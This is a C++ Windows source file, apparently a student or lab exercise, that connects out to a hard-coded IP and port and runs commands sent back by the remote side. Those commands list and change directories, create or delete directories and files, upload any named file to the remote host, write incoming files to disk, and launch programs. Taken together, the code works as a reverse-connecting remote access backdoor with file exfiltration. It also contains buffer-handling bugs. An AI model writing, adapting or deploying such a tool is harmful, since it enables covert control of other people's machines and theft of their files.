#define WIN32_LEAN_AND_MEAN

#define IPCLIENT "172.16.24.45"

#include <windows.h>
#include "winsock2.h"
#include "ws2tcpip.h"
#include "stdlib.h"
#include "stdio.h"
#include <iostream>
#include <direct.h>
#include <string.h>
#include <string>
#include <vector>
#include <shellapi.h>

#include "dirent.h" //  obtained from GITHUB  https://github.com/tronkko/dirent
#include <sys/types.h>

#define DEBUGPROG

using namespace std;

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment (lib, "User32.lib")


#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"

void main(int argc, char **argv)
{
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;
#ifndef DEBUGPROG
	char *sendbuf = argv[2];
#else
	const char *sendbuf = "fichier.exe";
#endif
	int iResult;
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;

	// Validate the parameters
#ifndef DEBUGPROG
	if (argc != 3) {
		cout << "usage: " << argv[0] << " server-name" << " filename" << +endl;  //***
		return;
	}
#endif
	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		cout << "WSAStartup failed with error: " << iResult << endl;
		return;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
#ifdef DEBUGPROG
	iResult = getaddrinfo(IPCLIENT, DEFAULT_PORT, &hints, &result);
#else
	iResult = getaddrinfo(argv[1], DEFAULT_PORT, &amp; hints, &amp; result);
#endif
	if (iResult != 0) {
		cout << "getaddrinfo failed with error: " << iResult << endl;
		WSACleanup();
		return;
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			cout << "socket failed with error: " << WSAGetLastError() << endl;
			WSACleanup();
			return;
		}

		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		cout << "Unable to connect to server!" << endl;
		WSACleanup();
		return;
	}

	// Receive user's commands
	bool done = false;
	while (!done)
	{
		int i, cumul;
		int taille;

		cumul = 0;
		// Receive command length
		while (cumul < sizeof(int) - 1)
		{
			iResult = recv(ConnectSocket,
				((char *)(&taille)) + cumul,
				sizeof(taille),
				0);
			cumul += iResult;
		}

		cumul = 0;
		char* commande = new char[taille];
		while (cumul < taille - 1) {
			iResult = recv(ConnectSocket,
				commande,  //***
				taille,
				0);
			cumul += iResult; //***
		}
		commande[taille] = '\0';

		char sstring[256], chaine[256];
		char *ptr;
		DIR *dir;
		struct dirent *ent;

		vector<string> argvect;
		int j = 0;
		string tmp;
		// split string into argument vector
		while (commande[j] != '\0')
		{
			if (commande[j] != ' ')
				tmp += commande[j];
			else
			{
				argvect.push_back(tmp);
				tmp.clear();
			}
			j++;
		}
		argvect.push_back(tmp);

		int iSendResult;
		string result;
		// 1- list directory
		if (argvect[0] == "dir")
		{
			if ((dir = opendir(".\\")) != NULL)
			{
				/* print all the files and directories within directory */
				while ((ent = readdir(dir)) != NULL) {
					result.append(ent->d_name);
					result += '\n';
				}
				closedir(dir);
			}
			else
				result = "command fail\n";
		}
		// 2- Change directory
		else if (argvect[0] == "cd")
		{
			if (argvect.size() < 2)
				result = "arguments needed\n";
			else
			{
				string dirname = argvect[1];
				if (_chdir(dirname.c_str()) == 0)
					result = "directory changed";
				else
					result = "command fail\n";
			}
		}
		// 3- Make directory
		else if (argvect[0] == "mkdir")
		{
			if (argvect.size() < 2)
				result = "arguments needed\n";
			else
			{
				string dirname = argvect[1];
				if (_mkdir(dirname.c_str()) == 0)
				{
					result = dirname;
					result.append(" created\n");
				}
				else
					result = "command fail\n";
			}
		}
		// 4- Remove directory
		else if (argvect[0] == "rmdir")
		{
			if (argvect.size() < 2)
				result = "arguments needed\n";
			else
			{
				string dirname = argvect[1];
				if (_rmdir(dirname.c_str()) == 0)
				{
					result = dirname;
					result.append(" removed\n");
				}
				else
					result = "command fail\n";
			}
		}
		// 5- Remove file
		else if (argvect[0] == "del")
		{
			if (argvect.size() < 2)
				result = "arguments needed\n";
			else
			{
				string dirname = argvect[1];
				if (remove(dirname.c_str()) == 0)
				{
					result = dirname;
					result.append(" removed\n");
				}
				else
					result = "command fail\n";
			}
		}
		// 6- Get file
		else if (argvect[0] == "get")
		{
			if (argvect.size() < 2)
				result = "arguments needed\n";
			else
			{
				string fileName = argvect[1];

				int length;
				FILE * file;
				char * byte_array;

				fopen_s(&file, argvect[1].c_str(), "rb");
				fseek(file, 0, SEEK_END);
				length = ftell(file);
				fseek(file, 0, SEEK_SET);
				byte_array = (char*)malloc(sizeof(char)*length);

				// envoie de la taille
				iSendResult = send(ConnectSocket, (char *)(&length), sizeof(int), 0);
				size_t j = 0;
				if (!byte_array)
				{
					printf("error memory\n");
					return;
				}
				// envoie du fichier
				fread(byte_array, sizeof(char), length, file);
				iSendResult = send(ConnectSocket, byte_array, length, 0);
				fclose(file);
				result = "file <";
				result.append(fileName);
				result.append("> received, ");
				result.append(to_string(length));
				result.append(" bytes received\n");
			}
		}
		// 7- Put file
		else if (argvect[0] == "put")
		{
			if (argvect.size() < 2)
				result = "arguments needed\n";
			else
			{
				int cumul;
				int taille;

				cumul = 0;

				// reçoit la taille du fichier
				while (cumul < sizeof(int) - 1) {
					iResult = recv(ConnectSocket,
						((char *)(&taille)) + cumul,
						sizeof(taille),
						0);
					cumul += iResult;
				}
				cumul = 0;
				FILE * recv_file;

				// ouverture du fichier avant de recevoir les informations
				if (fopen_s(&recv_file, argvect[1].c_str(), "ab") != 0)
				{
					cout << "could not open" << argvect[1] << endl;
					return;
				}

				// recoit tout le fichier
				while (cumul < taille - 1) {
					if (cumul + recvbuflen > taille)
						recvbuflen = taille - cumul;
					else
						recvbuflen = DEFAULT_BUFLEN;
					iResult = recv(ConnectSocket,
						&recvbuf[0],
						recvbuflen,
						0);
					fwrite(recvbuf, sizeof(char), iResult, recv_file);
					cumul += iResult;
				}
				fclose(recv_file);
				result = "File \"";
				result.append(argvect[1]);
				result.append("\" received, ");
				result.append(to_string(taille));
				result.append(" bytes received\n");
			}
		}
		// 8- Start
		else if (argvect[0] == "start")
		{
			if (argvect.size() < 2)
				result = "arguments needed";
			else
			{
				ShellExecute(NULL, "open", argvect[1].c_str(), NULL, NULL, SW_SHOWNORMAL);
				result = "program launched\n";
			}
		}
		// Help
		else if (argvect[0] == "help")
		{
			result = "Commands :\n";
			result.append("  dir : list directory\n");
			result.append("  cd <path> : change directory to <path>\n");
			result.append("  mkdir <dirname> : create new directory named <dirname>\n");
			result.append("  rmdir <dirname> : remove <dirname> directory\n");
			result.append("  del <file> : delete <file>\n");
			result.append("  get <file> : get <file> to your computer\n");
			result.append("  put <file> : put <file> to server\n");
			result.append("  start <program> : launch <program>\n");

		}
		// Quit
		else if (argvect[0] == "quit")
		{
			done = true;
			result = "quitting\n";
		}
		else
		{
			result = commande;
			result.append(" : unknow command\n");
		}

		result += '\0';
		int len = result.length();
		// Sending results
		iResult = send(ConnectSocket, (char *)(&len), sizeof(int), 0);
		iResult = send(ConnectSocket, result.c_str(), len, 0);
	}

	// cleanup
	closesocket(ConnectSocket);
	WSACleanup();

	return;
}